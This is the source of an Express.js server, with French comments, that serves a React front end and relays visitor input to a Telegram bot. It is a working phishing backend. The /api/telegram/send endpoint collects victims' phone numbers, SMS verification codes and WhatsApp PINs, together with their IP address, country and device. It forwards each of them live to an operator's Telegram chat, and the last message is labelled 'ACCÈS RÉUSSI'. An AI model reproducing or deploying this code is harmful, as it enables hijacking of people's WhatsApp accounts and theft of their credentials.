import express from 'express';
import fetch from 'node-fetch';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Charger les variables d'environnement depuis production.env
const envPath = path.join(__dirname, 'production.env');
if (fs.existsSync(envPath)) {
  const envContent = fs.readFileSync(envPath, 'utf8');
  envContent.split('\n').forEach(line => {
    const [key, value] = line.split('=');
    if (key && value && !process.env[key]) {
      process.env[key] = value.trim();
    }
  });
}

const app = express();
app.use(cors());
app.use(express.json());

// Servir les fichiers statiques du build React
app.use(express.static(path.join(__dirname, 'dist')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// Endpoint de test pour vérifier la connexion Telegram
app.get('/api/telegram/test', async (req, res) => {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(500).json({ error: 'Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID' });
    }

    const testMessage = [
      '🧪 Test de connexion Telegram',
      `🤖 Bot: @gasaa1_bot`,
      `👤 Chat ID: ${TELEGRAM_CHAT_ID}`,
      `🕒 Heure: ${new Date().toLocaleString('fr-FR')}`,
      '✅ Si vous recevez ce message, la configuration fonctionne !'
    ].join('\n');

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: TELEGRAM_CHAT_ID, 
        text: testMessage 
      })
    });

    const data = await response.json();
    if (!data.ok) {
      return res.status(500).json({ 
        error: 'Telegram API error', 
        details: data,
        botToken: TELEGRAM_BOT_TOKEN.substring(0, 10) + '...',
        chatId: TELEGRAM_CHAT_ID
      });
    }

    res.json({ 
      success: true, 
      message: 'Test message sent successfully',
      botToken: TELEGRAM_BOT_TOKEN.substring(0, 10) + '...',
      chatId: TELEGRAM_CHAT_ID
    });
  } catch (error) {
    res.status(500).json({ 
      error: 'Server error', 
      details: String(error),
      botToken: TELEGRAM_BOT_TOKEN.substring(0, 10) + '...',
      chatId: TELEGRAM_CHAT_ID
    });
  }
});

app.post('/api/telegram/send', async (req, res) => {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('❌ Telegram configuration missing:', {
        token: TELEGRAM_BOT_TOKEN ? 'Present' : 'Missing',
        chatId: TELEGRAM_CHAT_ID ? 'Present' : 'Missing'
      });
      return res.status(500).json({ error: 'Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID' });
    }

    const { phoneNumber, verificationCode, whatsappPin, messageType } = req.body || {};
    
    // Get client IP (works with Render's proxy)
    const forwardedFor = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '';
    const remoteIp = forwardedFor.split(',')[0]?.trim() || req.socket.remoteAddress || 'Unknown';
    
    // Get user agent and referer for more info
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || 'Direct';

    console.log('📨 Received data:', { messageType, phoneNumber: phoneNumber ? 'Present' : 'Empty', verificationCode: verificationCode ? 'Present' : 'Empty', whatsappPin: whatsappPin ? 'Present' : 'Empty' });

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    // Send message based on type - only if field is not empty
    let messageText = '';
    let shouldSend = false;
    
    if (messageType === 'phone' && phoneNumber && phoneNumber.trim() !== '') {
      messageText = [
        '🆕 **NOUVEAU FORMULAIRE**',
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        '📱 **Numéro de téléphone saisi:**',
        `🔢 **Téléphone:** \`${phoneNumber}\``,
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        `🌐 **IP:** \`${remoteIp}\``,
        `🕒 **Heure:** ${new Date().toLocaleString('fr-FR')}`,
        `🌍 **Pays:** ${req.headers['cf-ipcountry'] || 'Unknown'}`,
        `📱 **Device:** ${userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}`,
        `🔗 **Source:** ${referer}`,
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        '⏳ **En attente du code de vérification...**'
      ].join('\n');
      shouldSend = true;
    } else if (messageType === 'code' && verificationCode && verificationCode.trim() !== '') {
      messageText = [
        '🔐 **CODE DE VÉRIFICATION REÇU**',
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        '🔢 **Code saisi:**',
        `🔑 **Code:** \`${verificationCode}\``,
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        `🌐 **IP:** \`${remoteIp}\``,
        `🕒 **Heure:** ${new Date().toLocaleString('fr-FR')}`,
        `🌍 **Pays:** ${req.headers['cf-ipcountry'] || 'Unknown'}`,
        `📱 **Device:** ${userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}`,
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        '⏳ **En attente du PIN WhatsApp...**'
      ].join('\n');
      shouldSend = true;
    } else if (messageType === 'pin' && whatsappPin && whatsappPin.trim() !== '') {
      messageText = [
        '🔒 **PIN WHATSAPP REÇU**',
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        '🔐 **PIN saisi:**',
        `🔑 **PIN:** \`${whatsappPin}\``,
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        `🌐 **IP:** \`${remoteIp}\``,
        `🕒 **Heure:** ${new Date().toLocaleString('fr-FR')}`,
        `🌍 **Pays:** ${req.headers['cf-ipcountry'] || 'Unknown'}`,
        `📱 **Device:** ${userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}`,
        '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        '✅ **FORMULAIRE COMPLET - ACCÈS RÉUSSI !**'
      ].join('\n');
      shouldSend = true;
    }

    // Only send if we have a valid message
    if (shouldSend && messageText) {
      console.log('📤 Sending to Telegram...');
      
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: TELEGRAM_CHAT_ID, 
          text: messageText,
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        })
      });

      const data = await response.json();
      console.log('📨 Telegram response:', data);
      
      if (!data.ok) {
        console.error('❌ Telegram API error:', data);
        return res.status(500).json({ error: 'Telegram API error', details: data });
      }
      
      console.log('✅ Message sent successfully to Telegram');
    } else {
      console.log('⚠️ No valid data to send');
    }

    res.json({ ok: true, message: 'Data processed successfully' });
  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ error: 'Server error', details: String(error) });
  }
});

// Route pour toutes les pages React (SPA)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

const PORT = process.env.PORT || 5176;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Production build served from: ${path.join(__dirname, 'dist')}`);
  console.log(`Telegram Bot Token: ${TELEGRAM_BOT_TOKEN ? '✅ Configuré' : '❌ Manquant'}`);
  console.log(`Telegram Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Configuré' : '❌ Manquant'}`);
  console.log(`✅ Serveur prêt à recevoir des connexions !`);
});


